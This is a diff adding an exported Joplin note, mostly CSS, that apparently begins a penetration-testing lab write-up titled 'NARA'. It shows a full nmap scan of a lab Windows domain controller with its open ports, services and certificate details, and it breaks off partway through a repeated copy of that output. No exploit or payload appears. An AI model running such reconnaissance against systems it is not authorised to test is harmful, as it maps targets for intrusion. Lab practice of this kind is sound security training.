@@ -1,0 +1,1575 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>NARA</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">NARA</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h3 id="nara">NARA</h3>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.175.30 -p-     
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 15:28 -0400
+Nmap scan report for 192.168.175.30
+Host is up (0.0061s latency).
+Not shown: 65512 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-13 19:30:22Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-13T19:32:02+00:00; +3s from scanner time.
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:Nara.nara-security.com
+| Not valid before: 2023-07-30T14:09:26
+|_Not valid after:  2024-07-29T14:09:26
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-13T19:32:02+00:00; +3s from scanner time.
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:Nara.nara-security.com
+| Not valid before: 2023-07-30T14:09:26
+|_Not valid after:  2024-07-29T14:09:26
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:Nara.nara-security.com
+| Not valid before: 2023-07-30T14:09:26
+|_Not valid after:  2024-07-29T14:09:26
+|_ssl-date: 2026-03-13T19:32:02+00:00; +3s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-13T19:32:02+00:00; +3s from scanner time.
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:Nara.nara-security.com
+| Not valid before: 2023-07-30T14:09:26
+|_Not valid after:  2024-07-29T14:09:26
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Not valid before: 2026-03-12T19:27:29
+|_Not valid after:  2026-09-11T19:27:29
+| rdp-ntlm-info: 
+|   Target_Name: NARASEC
+|   NetBIOS_Domain_Name: NARASEC
+|   NetBIOS_Computer_Name: NARA
+|   DNS_Domain_Name: nara-security.com
+|   DNS_Computer_Name: Nara.nara-security.com
+|   DNS_Tree_Name: nara-security.com
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-03-13T19:31:22+00:00
+|_ssl-date: 2026-03-13T19:32:02+00:00; +3s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49686/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+49704/tcp open  msrpc         Microsoft Windows RPC
+49707/tcp open  msrpc         Microsoft Windows RPC
+49738/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 4 hops
+Service Info: Host: NARA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 2s, deviation: 0s, median: 2s
+| smb2-time: 
+|   date: 2026-03-13T19:31:26
+|_  start_date: N/A
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT     ADDRESS
+1   6.64 ms 192.168.45.1
+2   6.59 ms 192.168.45.254
+3   6.69 ms 192.168.251.1
+4   6.67 ms 192.168.175.30
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 215.45 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.175.30 -p-     
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 15:28 -0400
+Nmap scan report for 192.168.175.30
+Host is up (0.0061s latency).
+Not shown: 65512 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
